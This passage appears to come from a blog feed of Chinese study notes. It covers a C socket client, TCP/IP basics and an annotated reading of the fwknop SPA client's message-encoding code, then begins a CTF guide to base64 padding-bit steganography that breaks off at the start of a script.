class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="client">client</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERV_PORT 6666</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>;</span><br><span class="hljs-type">char</span> buf[MAXLINE];<br><span class="hljs-type">int</span> sockfd, n;<br><span class="hljs-type">char</span> *str;<br><br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br><span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;usage: ./client message\n&quot;</span>, <span class="hljs-built_in">stderr</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>str = argv[<span class="hljs-number">1</span>];<br><br>sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><br>bzero(&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));<br>servaddr.sin_family = AF_INET;<br>inet_pton(AF_INET, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, &amp;servaddr.sin_addr);<br>servaddr.sin_port = htons(SERV_PORT);<br><br>connect(sockfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));<br><br>write(sockfd, str, <span class="hljs-built_in">strlen</span>(str));<br><br>n = read(sockfd, buf, MAXLINE);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Response from server:\n&quot;</span>);<br>write(STDOUT_FILENO, buf, n);<br>close(sockfd);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="TCP-IP">TCP/IP</h1><h3 id="OSI各种设备和作用以及对应网络分层">OSI各种设备和作用以及对应网络分层</h3><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_1.png" alt="TCP/IP_1"></p><h2 id="TCP-IP与OSI模型">TCP/IP与OSI模型</h2><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_2.png" alt="TCP/IP_2"></p><h3 id="TCP-IP发送邮件时的分层处理">TCP/IP发送邮件时的分层处理</h3><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_3.png" alt="TCP/IP_3"></p><p>包中的结构</p><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_4.png" alt="TCP/IP_4"></p><h3 id="共享介质型网络">共享介质型网络</h3><h4 id="争用方式">争用方式</h4><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_5.png" alt="TCP/IP_5"></p><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_6.png" alt="TCP/IP_6"></p><h3 id="疑问">疑问</h3><p>要是一直有一个主机发送过程中一直与其他计算机冲突，该主机一直无法完整发送数据该怎么办？</p><h4 id="令牌传递方式">令牌传递方式</h4><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_7.png" alt="TCP/IP_7"></p><h2 id="PPP">PPP</h2><p>点对点协议。物理层也需要连接</p><h4 id="数据帧格式">数据帧格式</h4><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_8.png" alt="TCP/IP_8"></p><h2 id="IP协议">IP协议</h2><h3 id="IP地址">IP地址</h3><p>分类：A、B、C、D类</p><h1 id="fwknop项目">fwknop项目</h1><h2 id="client分析">client分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fko_context</span> &#123;</span><br>    <span class="hljs-comment">/** \name FKO SPA user-definable message data */</span><br><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">char</span>           *rand_val; <span class="hljs-comment">//随机值</span><br>    <span class="hljs-type">char</span>           *username; <span class="hljs-comment">//用户名</span><br>    <span class="hljs-type">time_t</span>          timestamp; <span class="hljs-comment">//时间戳</span><br>    <span class="hljs-type">short</span>           message_type; <span class="hljs-comment">//消息类型，表示message字段的内容类型。</span><br>    <span class="hljs-type">char</span>           *message; <span class="hljs-comment">//用户自定义的消息数据。</span><br>    <span class="hljs-type">char</span>           *nat_access; <span class="hljs-comment">//NAT（Network Address Translation）访问字符串，用于处理NAT穿透。</span><br>    <span class="hljs-type">char</span>           *server_auth; <span class="hljs-comment">//服务器认证信息</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    client_timeout; <span class="hljs-comment">//客户端超时时间，表示一次请求的有效期</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br>    <span class="hljs-comment">/** \name FKO SPA user-settable message encoding types */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">short</span>  digest_type; <span class="hljs-comment">//摘要类型，用于消息摘要的算法类型。</span><br>    <span class="hljs-type">short</span>  encryption_type; <span class="hljs-comment">//加密类型，表示消息的加密算法类型。</span><br>    <span class="hljs-type">int</span>    encryption_mode; <span class="hljs-comment">//加密模式，表示加密算法的模式（例如，ECB，CBC等）</span><br>    <span class="hljs-type">short</span>  hmac_type; <span class="hljs-comment">//HMAC（Hash-based Message Authentication Code）类型，用于消息认证码的算法类型</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br>    <span class="hljs-comment">/** \name Computed or predefined data */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">char</span>           *version; <span class="hljs-comment">//版本信息</span><br>    <span class="hljs-type">char</span>           *digest; <span class="hljs-comment">//消息摘要，用于数据完整性验证</span><br>    <span class="hljs-type">int</span>             digest_len; <span class="hljs-comment">//消息摘要的长度</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br>    <span class="hljs-comment">/** \name Digest of raw encrypted/base64 data</span><br><span class="hljs-comment">     * This is used for replay attack detection</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">char</span>           *raw_digest; <span class="hljs-comment">//原始加密/编码数据的摘要，用于防止重放攻击</span><br>    <span class="hljs-type">short</span>           raw_digest_type; <span class="hljs-comment">//原始加密/编码数据的摘要类型</span><br>    <span class="hljs-type">int</span>             raw_digest_len; <span class="hljs-comment">//原始加密/编码数据的摘要长度</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br>    <span class="hljs-comment">/** \name Computed processed data (encodings, etc.) */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">char</span>           *encoded_msg; <span class="hljs-comment">//编码后的消息数据</span><br>    <span class="hljs-type">int</span>             encoded_msg_len; <span class="hljs-comment">//编码后的消息数据长度</span><br>    <span class="hljs-type">char</span>           *encrypted_msg; <span class="hljs-comment">//加密后的消息数据</span><br>    <span class="hljs-type">int</span>             encrypted_msg_len; <span class="hljs-comment">//加密后的消息数据长度</span><br>    <span class="hljs-type">char</span>           *msg_hmac; <span class="hljs-comment">//消息认证码</span><br>    <span class="hljs-type">int</span>             msg_hmac_len; <span class="hljs-comment">//消息认证码的长度</span><br>    <span class="hljs-type">int</span>             added_salted_str; <span class="hljs-comment">//标记是否添加了盐值字符串</span><br>    <span class="hljs-type">int</span>             added_gpg_prefix; <span class="hljs-comment">//标记是否添加了GPG（GNU Privacy Guard）前缀</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br>    <span class="hljs-comment">/** \name State info */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    state; <span class="hljs-comment">//状态信息，表示当前上下文的状态。</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   initval; <span class="hljs-comment">//初始化值。</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_LIBGPGME</span><br>    <span class="hljs-comment">/** \name For gpgme support */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">char</span>           *gpg_exe; <span class="hljs-comment">//GPG执行程序路径</span><br>    <span class="hljs-type">char</span>           *gpg_recipient; <span class="hljs-comment">//GPG接收者（用于加密和解密）</span><br>    <span class="hljs-type">char</span>           *gpg_signer; <span class="hljs-comment">//GPG签名者（用于签名和验证）</span><br>    <span class="hljs-type">char</span>           *gpg_home_dir; <span class="hljs-comment">//GPG的主目录</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   have_gpgme_context; <span class="hljs-comment">//是否有GPGME（GnuPG Made Easy）上下文</span><br><br>    <span class="hljs-type">gpgme_ctx_t</span>     gpg_ctx; <span class="hljs-comment">//GPGME上下文</span><br>    <span class="hljs-type">gpgme_key_t</span>     recipient_key; <span class="hljs-comment">//GPG接收者密钥</span><br>    <span class="hljs-type">gpgme_key_t</span>     signer_key; <span class="hljs-comment">//GPG签名者密钥</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   verify_gpg_sigs; <span class="hljs-comment">//是否验证GPG签名</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   ignore_gpg_sig_error; <span class="hljs-comment">//是否忽略GPG签名错误</span><br><br>    <span class="hljs-type">fko_gpg_sig_t</span>   gpg_sigs; <span class="hljs-comment">//GPG签名信息</span><br><br>    <span class="hljs-type">gpgme_error_t</span>   gpg_err; <span class="hljs-comment">//GPG错误信息</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* HAVE_LIBGPGME */</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="问题1">问题1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">fko_encode_spa_data</span><span class="hljs-params">(<span class="hljs-type">fko_ctx_t</span> ctx)</span><br>&#123;<br>    <span class="hljs-type">int</span>     res, offset = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span>   *tbuf;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_LIBFIU</span><br>    fiu_return_on(<span class="hljs-string">&quot;fko_encode_spa_data_init&quot;</span>, FKO_ERROR_CTX_NOT_INITIALIZED);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/* Must be initialized</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(!CTX_INITIALIZED(ctx))<br>        <span class="hljs-keyword">return</span>(FKO_ERROR_CTX_NOT_INITIALIZED);<br><br>    <span class="hljs-comment">/* Check prerequisites.</span><br><span class="hljs-comment">     * --DSS <span class="hljs-doctag">XXX:</span>  Needs review.  Also, we could make this more robust (or</span><br><span class="hljs-comment">     *             (at leaset expand the error reporting for the missing</span><br><span class="hljs-comment">     *             data).</span><br><span class="hljs-comment">    */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_LIBFIU</span><br>    fiu_return_on(<span class="hljs-string">&quot;fko_encode_spa_data_valid&quot;</span>, FKO_ERROR_INCOMPLETE_SPA_DATA);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span>(  validate_username(ctx-&gt;username) != FKO_SUCCESS<br>      || ctx-&gt;version  == <span class="hljs-literal">NULL</span> || strnlen(ctx-&gt;version, MAX_SPA_VERSION_SIZE)  == <span class="hljs-number">0</span><br>      || ctx-&gt;message  == <span class="hljs-literal">NULL</span> || strnlen(ctx-&gt;message, MAX_SPA_MESSAGE_SIZE)  == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span>(FKO_ERROR_INCOMPLETE_SPA_DATA);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(ctx-&gt;message_type == FKO_NAT_ACCESS_MSG)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(ctx-&gt;nat_access == <span class="hljs-literal">NULL</span> || strnlen(ctx-&gt;nat_access, MAX_SPA_MESSAGE_SIZE) == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span>(FKO_ERROR_INCOMPLETE_SPA_DATA);<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_LIBFIU</span><br>    fiu_return_on(<span class="hljs-string">&quot;fko_encode_spa_data_calloc&quot;</span>, FKO_ERROR_MEMORY_ALLOCATION);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/* Allocate our initial tmp buffer.</span><br><span class="hljs-comment">    */</span><br>    tbuf = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, FKO_ENCODE_TMP_BUF_SIZE);<br>    <span class="hljs-keyword">if</span>(tbuf == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>(FKO_ERROR_MEMORY_ALLOCATION);<br><br>    <span class="hljs-comment">/* Put it together a piece at a time, starting with the rand val.</span><br><span class="hljs-comment">    */</span><br>    strlcpy(tbuf, ctx-&gt;rand_val, FKO_ENCODE_TMP_BUF_SIZE);<br><br>    <span class="hljs-comment">/* Add the base64-encoded username.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">/*-----------------------------------------------------------------*/</span><br>    strlcat(tbuf, <span class="hljs-string">&quot;:&quot;</span>, FKO_ENCODE_TMP_BUF_SIZE); <span class="hljs-comment">//只添加了一个冒号，为什么长度要是1024</span><br>    <span class="hljs-keyword">if</span>((res = append_b64(tbuf, ctx-&gt;username)) != FKO_SUCCESS)<br>    &#123;<br>        <span class="hljs-built_in">free</span>(tbuf);<br>        <span class="hljs-keyword">return</span>(res);<br>    &#125;<br><br>    <span class="hljs-comment">/* Add the timestamp.</span><br><span class="hljs-comment">    */</span><br>    offset = <span class="hljs-built_in">strlen</span>(tbuf);<br>    <span class="hljs-built_in">snprintf</span>(((<span class="hljs-type">char</span>*)tbuf+offset), FKO_ENCODE_TMP_BUF_SIZE - offset,<br>            <span class="hljs-string">&quot;:%u:&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>) ctx-&gt;timestamp);<br><br>    <span class="hljs-comment">/* Add the version string.</span><br><span class="hljs-comment">    */</span><br>    strlcat(tbuf, ctx-&gt;version, FKO_ENCODE_TMP_BUF_SIZE);<br><br>    <span class="hljs-comment">/* Before we add the message type value, we will once again</span><br><span class="hljs-comment">     * check for whether or not a client_timeout was specified</span><br><span class="hljs-comment">     * since the message_type was set.  If this is the case, then</span><br><span class="hljs-comment">     * we want to adjust the message_type first.  The easy way</span><br><span class="hljs-comment">     * to do this is simply call fko_set_spa_client_timeout and set</span><br><span class="hljs-comment">     * it to its current value.  This will force a re-check and</span><br><span class="hljs-comment">     * possible reset of the message type.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">    */</span><br>    fko_set_spa_client_timeout(ctx, ctx-&gt;client_timeout);<br><br>    <span class="hljs-comment">/* Add the message type value.</span><br><span class="hljs-comment">    */</span><br>    offset = <span class="hljs-built_in">strlen</span>(tbuf);<br>    <span class="hljs-built_in">snprintf</span>(((<span class="hljs-type">char</span>*)tbuf+offset), FKO_ENCODE_TMP_BUF_SIZE - offset,<br>            <span class="hljs-string">&quot;:%i:&quot;</span>, ctx-&gt;message_type);<br><br>    <span class="hljs-comment">/* Add the base64-encoded SPA message.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>((res = append_b64(tbuf, ctx-&gt;message)) != FKO_SUCCESS)<br>    &#123;<br>        <span class="hljs-built_in">free</span>(tbuf);<br>        <span class="hljs-keyword">return</span>(res);<br>    &#125;<br><br>    <span class="hljs-comment">/* If a nat_access message was given, add it to the SPA</span><br><span class="hljs-comment">     * message.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(ctx-&gt;nat_access != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        strlcat(tbuf, <span class="hljs-string">&quot;:&quot;</span>, FKO_ENCODE_TMP_BUF_SIZE);<br>        <span class="hljs-keyword">if</span>((res = append_b64(tbuf, ctx-&gt;nat_access)) != FKO_SUCCESS)<br>        &#123;<br>            <span class="hljs-built_in">free</span>(tbuf);<br>            <span class="hljs-keyword">return</span>(res);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* If we have a server_auth field set.  Add it here.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(ctx-&gt;server_auth != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        strlcat(tbuf, <span class="hljs-string">&quot;:&quot;</span>, FKO_ENCODE_TMP_BUF_SIZE);<br>        <span class="hljs-keyword">if</span>((res = append_b64(tbuf, ctx-&gt;server_auth)) != FKO_SUCCESS)<br>        &#123;<br>            <span class="hljs-built_in">free</span>(tbuf);<br>            <span class="hljs-keyword">return</span>(res);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* If a client timeout is specified and we are not dealing with a</span><br><span class="hljs-comment">     * SPA command message, add the timeout here.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(ctx-&gt;client_timeout &gt; <span class="hljs-number">0</span> &amp;&amp; ctx-&gt;message_type != FKO_COMMAND_MSG)<br>    &#123;<br>        offset = <span class="hljs-built_in">strlen</span>(tbuf);<br>        <span class="hljs-built_in">snprintf</span>(((<span class="hljs-type">char</span>*)tbuf+offset), FKO_ENCODE_TMP_BUF_SIZE - offset,<br>                <span class="hljs-string">&quot;:%i&quot;</span>, ctx-&gt;client_timeout);<br>    &#125;<br><br>    <span class="hljs-comment">/* If encoded_msg is not null, then we assume it needs to</span><br><span class="hljs-comment">     * be freed before re-assignment.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(ctx-&gt;encoded_msg != <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-built_in">free</span>(ctx-&gt;encoded_msg);<br><br>    <span class="hljs-comment">/* Copy our encoded data into the context.</span><br><span class="hljs-comment">    */</span><br>    ctx-&gt;encoded_msg = strdup(tbuf);<br>    <span class="hljs-built_in">free</span>(tbuf);<br><br>    <span class="hljs-keyword">if</span>(ctx-&gt;encoded_msg == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>(FKO_ERROR_MEMORY_ALLOCATION);<br><br>    ctx-&gt;encoded_msg_len = strnlen(ctx-&gt;encoded_msg, MAX_SPA_ENCODED_MSG_SIZE);<br><br>    <span class="hljs-keyword">if</span>(! is_valid_encoded_msg_len(ctx-&gt;encoded_msg_len))<br>        <span class="hljs-keyword">return</span>(FKO_ERROR_INVALID_DATA_ENCODE_MSGLEN_VALIDFAIL);<br><br>    <span class="hljs-comment">/* At this point we can compute the digest for this SPA data.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>((res = fko_set_spa_digest(ctx)) != FKO_SUCCESS)<br>        <span class="hljs-keyword">return</span>(res);<br><br>    <span class="hljs-comment">/* Here we can clear the modified flags on the SPA data fields.</span><br><span class="hljs-comment">    */</span><br>    FKO_CLEAR_SPA_DATA_MODIFIED(ctx);<br><br>    <span class="hljs-keyword">return</span>(FKO_SUCCESS);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="问题2">问题2</h3><p>为什么一会用strcat一会用snprintf的方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">strlcat(tbuf, <span class="hljs-string">&quot;:&quot;</span>, FKO_ENCODE_TMP_BUF_SIZE);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//获取当前的tbuf的长度</span><br>offset = <span class="hljs-built_in">strlen</span>(tbuf);<br><span class="hljs-built_in">snprintf</span>(((<span class="hljs-type">char</span>*)tbuf+offset), FKO_ENCODE_TMP_BUF_SIZE - offset,<br>            <span class="hljs-string">&quot;:%u:&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>) ctx-&gt;timestamp);<br></code></pre></td></tr></table></figure><h3 id="问题3">问题3</h3><p>这个是什么，为什么几乎每个函数前面都有这个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_LIBFIU</span><br>    fiu_return_on(<span class="hljs-string">&quot;fko_set_spa_digest_init&quot;</span>, FKO_ERROR_CTX_NOT_INITIALIZED);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>零信任</tag>
      
      <tag>socket编程</tag>
      
      <tag>iptables原理</tag>
      
      <tag>TCP/IP</tag>
      
      <tag>SPA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc</title>
    <link href="/2023/07/08/misc/"/>
    <url>/2023/07/08/misc/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-MISC学习指南">CTF-MISC学习指南</h1><h2 id="Base64隐写">Base64隐写</h2><p>想了解base64的隐写首先就得知道它是怎么编码解码的</p><h3 id="编码">编码</h3><p>编码时，将要编码的内容转换为二进制数据（一个字符对应8位二进制），每6位作为一组，从索引表中找到对应的字符，的位置补0，最后不足四位的补=</p><h3 id="解码">解码</h3><p>编码时补充了0增加等号，解码时去除等号并对应删除编码时补充的0，正因为这一点，使隐写成为可能。</p><p>上述所说的补位0所在的位置，加入我们修改为其他二进制数，而不是默认的全0，在做base64解码的时候，是不会影响解码结果的，因为这些补位0所在的位置，解码时都会被删除，所以不影响解码结果。</p><p>所以我们想要隐藏信息的话，就可以利用这些补位0所在的位置，base64编码后的字符串，如果有1个等号，就有两个bit的补位0可隐写，如果有2个等号，就有四个bit的补位0可隐写；如果没有等号，就没有补位0可隐写。</p><p>贴脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 